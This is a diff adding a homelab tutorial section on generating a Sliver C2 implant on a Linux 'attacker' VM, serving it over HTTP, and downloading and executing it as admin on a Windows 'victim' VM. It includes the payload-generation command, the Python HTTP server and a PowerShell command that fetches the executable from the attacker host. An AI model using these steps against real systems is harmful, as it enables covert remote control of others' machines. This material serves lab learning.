@@ -143,3 +143,75 @@ sliver-server
 ```
 We should see something like this:
 ![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/sliver-server.png)
+
+type "exit" to close our sliver session.
+
+#### We will generate a Command and Conrol (C2) pyload with sliver server
+
+First, obtain your Linux VM IP address.
+
+Then let's elevate to super user with:
+```
+sudo su
+```
+
+Now change directory to the one we created before:
+```
+cd /opt/sliver
+```
+
+And from there, launch sliver-server:
+```
+sliver-server
+```
+
+And we will ask our bad boy to generate a C2 payload for us, replace the IP with the IP address of your own Linux VM:
+```
+generate --http 172.16.162.129 --save /opt/sliver
+
+##Allow this to run for 2 minutes or so.
+```
+
+We should be seeing something like this:
+![alt text](https://raw.githubusercontent.com/raulpz/raulpz.github.io/main/assets/images/sliverpayload.png)
+
+C2 Payload name is "APPLICABLE_SUBSTANCE.exe"
+
+Good, type "exit".
+
+Now we need to transfer this payload to our Victim, the Windows O.S. VM.
+Thanks to Mr. Capuano (go ahead and google Eric Capuano, follow him, tail him... etc), we have a very simple way of achieving this with Python:
+```
+python3 -m http.server 80
+```
+And that's it! (for now...).
+
+#### Now, we are back with our Victim
+
+Open Powershell (or Windows Terminal, we should be using Windows Terminal now a days) as Admin, and run this command, to Download the Payload from the Linux Attacker
+into the Downloads folder of our Victim:
+```
+IWR -Uri http://172.16.162.128/APPLICABLE_SUBSTANCE.exe -Outfile C:\Users\User\Downloads\APPLICABLE_SUBSTANCE.exe 
+```
+#### Back to the Linux Attacker
+
+This will be quick:
+
+CRTL + C to kill the http server
+
+exit out of sliver-server with "exit"
+
+and Relaunch sliver-server.
+```
+sliver-server
+```
+
+#### Now, we are back with our Victim (The Windows O.S. VM)
+
+Time to plan the bomb, as admin from the Terminal, run:
+```
+C:\Users\User\Downloads\<your_C2-implant>.exe
+```
+
+
+
